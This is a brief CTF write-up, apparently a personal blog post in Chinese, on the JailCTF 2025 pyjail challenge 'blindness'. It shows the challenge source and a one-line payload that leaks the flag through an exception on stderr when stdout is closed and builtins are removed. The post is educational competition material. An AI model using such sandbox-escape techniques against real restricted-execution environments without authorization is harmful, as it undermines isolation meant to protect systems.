---
title: "JailCTF 2025 Write Up"
date: 2025-10-05T21:54:07+08:00
draft: false # Set 'false' to publish
tableOfContents: false # Enable/disable Table of Contents
description: ''
categories:
  - CTF
tags:
  - Write Up
---

## pyjail
### blindness

source code:
```python
import sys
inp = input('blindness > ')
sys.stdout.close()
flag = open('flag.txt').read()
eval(inp, {'__builtins__': {}, 'flag': flag})
print('bye bye')
```

簡單說就是沒有直接回顯跟 builtin 的 jail  
flag 是可以直接存取 但沒有 stdout 也沒辦法 print 出來  
可以改成觸發 Exception 來讓 flag 出現在 stderr 裡面  

payload:
```python
().__getattribute__(flag)
```

Flag: `jail{stderr_leak_5fd787f079eb69e}`

--- 

# END

蛤 ? 你問怎麼只有這樣只有一題 ?  
去看 [Securinets-CTF-2025](../securinets-ctf-2025/) 啦  